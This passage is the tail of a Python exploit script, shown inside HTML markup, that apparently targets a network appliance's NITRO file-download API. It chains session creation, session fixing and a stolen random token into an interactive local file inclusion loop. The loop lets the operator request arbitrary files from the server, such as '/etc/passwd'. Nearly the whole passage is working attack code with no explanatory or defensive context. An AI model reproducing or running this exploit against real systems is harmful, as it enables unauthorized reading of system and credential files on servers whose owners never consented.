'{0}/rapi/filedownload?filter=path:{1}'.format(base_url, PAYLOAD)<br /><br />    headers = {<br />        'Content-Type':'application/xml',<br />        'X-NITRO-USER':random_string(),<br />        'X-NITRO-PASS':random_string(),<br />        'rand_key':rand<br />    }<br /><br />    data = '&lt;clipermission&gt;&lt;/clipermission&gt;'<br />    proxies = {"http":"http://127.0.0.1:8080/"}<br />    r = session.post(url=url, headers=headers, data=data, verify=False,proxies=proxies)<br />    response_str = json.dumps(r.headers.__dict__['_store'])<br /><br />    if r.status_code == 406 and "Content-Disposition" in response_str and r.headers["Accept-Ranges"] == "bytes" and r.headers["Pragma"] == "private":<br />        print ("[+] Send Success!")<br />        print ("_"*80,"\n\n")<br />        print (r.text)<br />        print ("_"*80)<br />        while 1:<br />            PAYLOAD1 = quote(input("\n[+] Set File= "),"utf-8")<br />            url = '{0}/rapi/filedownload?filter=path:{1}'.format(base_url, PAYLOAD1)<br />            r = session.post(url=url, headers=headers, data=data, verify=False,proxies=proxies)<br />            if r.status_code == 406 and "Content-Disposition" in response_str and r.headers["Accept-Ranges"] == "bytes" and r.headers["Pragma"] == "private":<br />                print ("_"*80,"\n\n")<br />                print (r.text)<br />                print ("_"*80)<br />            # pass<br />    else:<br />        print ("[+] Error!")<br /><br />def main(base_url):<br />    print ('[-] Creating session..')<br />    session = requests.Session()<br />    create_session(base_url, session)<br />    print ('[+] Got session: {0}'.format(session.cookies.get_dict()['SESSID']))<br /><br />    print('[-] Fixing session..')<br />    fix_session(base_url, session)<br /><br />    print ('[-] Getting rand..')<br />    rand = get_rand(base_url, session)<br />    print ('[+] Got rand: {0}'.format(rand))<br /><br />    print ('[-] Re-breaking session..')<br />    create_session(base_url, session)<br /><br />    print ('[-] Getting file..')<br />    do_lfi(base_url, session, rand)<br /><br />if __name__ == '__main__':<br />    # Slashes need to be urlencoded<br />    base_url = sys.argv[1]<br />    if base_url[-1] == '/':<br />        base_url = base_url[:-1]<br />    else:<br />        base_url = base_url<br />    # PAYLOAD='%2fetc%2fpasswd'<br />    PAYLOAD = quote(input("[+] Set File= "),"utf-8")<br />    main(base_url)</p></body></html>